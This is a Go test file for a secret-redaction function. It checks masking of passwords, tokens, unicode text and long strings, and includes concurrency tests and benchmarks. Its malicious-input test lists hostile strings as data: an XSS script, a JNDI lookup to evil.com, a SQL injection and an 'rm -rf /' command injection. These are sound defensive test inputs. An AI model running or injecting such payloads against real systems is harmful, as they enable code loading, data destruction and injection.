package crypto

import (
	"strings"
	"testing"
	"unicode/utf8"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/testutil"
)

func TestRedact(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "empty string",
			input:    "",
			expected: "(empty)",
		},
		{
			name:     "simple string",
			input:    "hello",
			expected: "*****",
		},
		{
			name:     "string with spaces",
			input:    "hello world",
			expected: "***********",
		},
		{
			name:     "string with numbers",
			input:    "abc123",
			expected: "******",
		},
		{
			name:     "string with special characters",
			input:    "p@ssw0rd!",
			expected: "*********",
		},
		{
			name:     "single character",
			input:    "a",
			expected: "*",
		},
		{
			name:     "very long string",
			input:    strings.Repeat("secret", 100),
			expected: strings.Repeat("*", 600),
		},
		{
			name:     "string with unicode characters",
			input:    "héllo wörld",
			expected: "***********",
		},
		{
			name:     "string with emojis",
			input:    "hello 🌟 world",
			expected: "*************", // 13 runes: h e l l o [space] 🌟 [space] w o r l d
		},
		{
			name:     "string with newlines",
			input:    "line1\nline2",
			expected: "***********",
		},
		{
			name:     "string with tabs",
			input:    "col1\tcol2",
			expected: "*********",
		},
		{
			name:     "JSON-like string",
			input:    `{"secret":"value"}`,
			expected: "******************",
		},
		{
			name:     "URL-like string",
			input:    "https://user:pass@example.com",
			expected: "*****************************",
		},
		{
			name:     "token-like string",
			input:    "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
			expected: "*******************************************", // 43 runes
		},
		{
			name:     "path-like string",
			input:    "/var/lib/secrets/token.txt",
			expected: "**************************",
		},
		{
			name:     "only whitespace",
			input:    "   ",
			expected: "***",
		},
		{
			name:     "mixed unicode and ASCII",
			input:    "test αβγ 123",
			expected: "************", // 12 runes
		},
		{
			name:     "string with control characters",
			input:    "test\x00\x01\x02",
			expected: "*******", // 7 runes
		},
		{
			name:     "cyrillic characters",
			input:    "привет мир",
			expected: "**********",
		},
		{
			name:     "chinese characters",
			input:    "你好世界",
			expected: "****", // 4 runes
		},
		{
			name:     "arabic characters",
			input:    "مرحبا بالعالم",
			expected: "*************", // 13 runes
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
				t.Parallel()
			result := Redact(tc.input)
			testutil.AssertEqual(t, tc.expected, result)

			// Verify redacted string has same visual length as input for non-empty strings
			if tc.input != "" {
				inputRuneCount := utf8.RuneCountInString(tc.input)
				expectedAsterisks := strings.Count(result, "*")
				testutil.AssertEqual(t, inputRuneCount, expectedAsterisks)
			}
		})
	}
}

func TestRedactSecurity(t *testing.T) {
	t.Parallel()
	t.Run("no original data leaked in result", func(t *testing.T) {
		sensitiveInputs := []string{
			"password123",
			"secret-api-key-abcdef",
			"jwt-token-sensitive-data",
			"database-connection-string",
			"private-key-material",
		}

		for _, input := range sensitiveInputs {
			result := Redact(input)

			// Ensure no part of original input is present in result
			if strings.Contains(result, input) {
				t.Errorf("Redacted result contains original input: %s -> %s", input, result)
			}

			// Ensure result only contains asterisks and "(empty)" for empty inputs
			if input != "" && result != strings.Repeat("*", utf8.RuneCountInString(input)) {
				t.Errorf("Redacted result has unexpected format: %s -> %s", input, result)
			}
		}
	})

	t.Run("handles malicious inputs safely", func(t *testing.T) {
			t.Parallel()
		maliciousInputs := []string{
			"\x00\x01\x02\x03",                       // control characters
			"\n\r\t",                                 // whitespace characters
			"</script><script>alert('xss')</script>", // XSS attempt
			"${jndi:ldap://evil.com/a}",              // JNDI injection
			"'; DROP TABLE users; --",                // SQL injection
			"$(rm -rf /)",                            // command injection
		}

		for _, input := range maliciousInputs {
			t.Run("malicious_input", func(t *testing.T) {
					t.Parallel()
				result := Redact(input)

				// Should not panic or cause issues
				expectedLength := utf8.RuneCountInString(input)
				actualAsterisks := strings.Count(result, "*")
				testutil.AssertEqual(t, expectedLength, actualAsterisks)
			})
		}
	})

	t.Run("consistent output for same input", func(t *testing.T) {
			t.Parallel()
		input := "consistent-test-string"

		// Call Redact multiple times
		results := make([]string, 10)
		for i := 0; i < 10; i++ {
			results[i] = Redact(input)
		}

		// All results should be identical
		for i := 1; i < len(results); i++ {
			testutil.AssertEqual(t, results[0], results[i])
		}
	})
}

func TestRedactEdgeCases(t *testing.T) {
	t.Parallel()
	t.Run("very long strings", func(t *testing.T) {
		// Test with very long string (1MB)
		longInput := strings.Repeat("a", 1024*1024)
		result := Redact(longInput)

		expectedLength := len(longInput)
		actualLength := len(result)
		testutil.AssertEqual(t, expectedLength, actualLength)

		// Should be all asterisks
		testutil.AssertEqual(t, strings.Repeat("*", expectedLength), result)
	})

	t.Run("unicode edge cases", func(t *testing.T) {
			t.Parallel()
		unicodeTests := []struct {
			name  string
			input string
		}{
			{"combining characters", "e\u0301"},   // é as e + combining acute
			{"surrogate pairs", "𝕏"},              // mathematical script X
			{"zero width characters", "a\u200Bb"}, // zero width space
			{"right-to-left mark", "test\u200F"},  // right-to-left mark
			{"variation selectors", "👨‍💻"},        // man technologist emoji
		}

		for _, tc := range unicodeTests {
			t.Run(tc.name, func(t *testing.T) {
					t.Parallel()
				result := Redact(tc.input)

				// Should not panic and should produce asterisks
				runeCount := utf8.RuneCountInString(tc.input)
				asteriskCount := strings.Count(result, "*")
				testutil.AssertEqual(t, runeCount, asteriskCount)
			})
		}
	})

	t.Run("invalid UTF-8 sequences", func(t *testing.T) {
			t.Parallel()
		// Invalid UTF-8 byte sequences
		invalidUTF8 := []string{
			"\xff\xfe\xfd",  // invalid start bytes
			"valid\xff\xfe", // valid followed by invalid
			"\x80\x81\x82",  // continuation bytes without start
		}

		for _, input := range invalidUTF8 {
			t.Run("invalid_utf8", func(t *testing.T) {
					t.Parallel()
				// Should not panic
				result := Redact(input)

				// Should produce some output (behavior may vary for invalid UTF-8)
				testutil.AssertNotEqual(t, "", result)
			})
		}
	})
}

func TestRedactConcurrency(t *testing.T) {
	t.Parallel()
	t.Run("concurrent redaction", func(t *testing.T) {
		inputs := []string{
			"concurrent-test-1",
			"concurrent-test-2",
			"concurrent-test-3",
			"concurrent-test-4",
			"concurrent-test-5",
		}

		// Run concurrent redaction operations
		testutil.ParallelTest(t, 100, func(t *testing.T, i int) {
			input := inputs[i%len(inputs)]
			result := Redact(input)

			// Verify result format
			expectedLength := utf8.RuneCountInString(input)
			actualAsterisks := strings.Count(result, "*")
			testutil.AssertEqual(t, expectedLength, actualAsterisks)
		})
	})
}

func TestRedactUseCases(t *testing.T) {
	t.Parallel()
	t.Run("common secret formats", func(t *testing.T) {
		secrets := []struct {
			name   string
			secret string
		}{
			{"password", "mySecretPassword123!"},
			{"API key", "sk-1234567890abcdefghijklmnopqrstuvwxyz"},
			{"JWT token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"},
			{"database URL", "postgresql://user:password@localhost:5432/database"},
			{"private key", "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7VJT..."},
			{"credit card", "4532-1234-5678-9012"},
			{"social security", "123-45-6789"},
		}

		for _, tc := range secrets {
			t.Run(tc.name, func(t *testing.T) {
					t.Parallel()
				result := Redact(tc.secret)

				// Should not contain original secret
				testutil.AssertNotEqual(t, tc.secret, result)

				// Should be properly redacted
				if tc.secret != "" {
					expectedLength := utf8.RuneCountInString(tc.secret)
					testutil.AssertEqual(t, strings.Repeat("*", expectedLength), result)
				}
			})
		}
	})
}

func BenchmarkRedact(b *testing.B) {
	testCases := []struct {
		name  string
		input string
	}{
		{"short", "password"},
		{"medium", strings.Repeat("secret", 10)},
		{"long", strings.Repeat("verylongsecret", 100)},
		{"unicode", "测试密码αβγ🔒"},
	}

	for _, tc := range testCases {
		b.Run(tc.name, func(b *testing.B) {
			b.ResetTimer()
			for b.Loop() {
				_ = Redact(tc.input)
			}
		})
	}
}

func BenchmarkRedactConcurrent(b *testing.B) {
	input := "concurrent-benchmark-secret-string"

	b.RunParallel(func(pb *testing.PB) {
		for pb.Next() {
			_ = Redact(input)
		}
	})
}

func BenchmarkRedactVeryLong(b *testing.B) {
	// Test performance with very long strings
	longInput := strings.Repeat("secret", 10000) // ~60KB string

	b.ResetTimer()
	for b.Loop() {
		_ = Redact(longInput)
	}
}
